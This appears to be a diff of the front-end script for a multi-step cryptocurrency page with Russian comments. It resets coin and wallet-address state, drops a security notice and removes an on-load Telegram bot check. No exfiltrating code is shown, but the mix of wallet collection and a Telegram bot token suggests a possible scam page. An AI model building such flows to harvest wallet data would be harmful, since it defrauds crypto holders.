@@ -1337,17 +988,16 @@
             // Сброс переменных
             selectedCoin = null;
             walletAddress = '';
-            metamaskConfirmed = false;
+            hasBalance = false;
             
             // Сброс кнопок
-            nextToStep2.disabled = true;
             nextToStep3.disabled = true;
             nextToStep4.disabled = true;
             continueToStep2.disabled = true;
             
-            // Скрываем предупреждения
+            // Скрываем сообщения
+            topupMessage.classList.remove('show');
             warningMessage.style.display = 'none';
-            securityNotice.style.display = 'none';
             
             // Возврат на первый шаг
             step4.classList.remove('active');
@@ -1356,8 +1006,6 @@
             step1.classList.add('active');
             
             updateProgressBar(1);
-            
-            showStatus('', 'success');
         }
         
         function showStatus(message, type) {
@@ -1365,7 +1013,7 @@
             statusDiv.className = `status ${type}`;
             statusDiv.style.display = 'block';
             
-            if (type === 'success' || type === 'info') {
+            if (type === 'success') {
                 setTimeout(() => {
                     statusDiv.style.display = 'none';
                 }, 5000);
@@ -1377,22 +1025,8 @@
             resetToBeginning();
         });
         
-        // Проверка при загрузке
         window.addEventListener('load', () => {
-            console.log('✨ Сайт загружен');
-            
-            // Создаем CSS переменную для прогресс бара
-            progressBar.style.setProperty('--progress', '0%');
-            
-            // Проверяем Telegram
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('✅ Telegram бот активен');
-                    }
-                })
-                .catch(() => {});
+            updateProgressBar(1);
         });
     </script>
 </body>
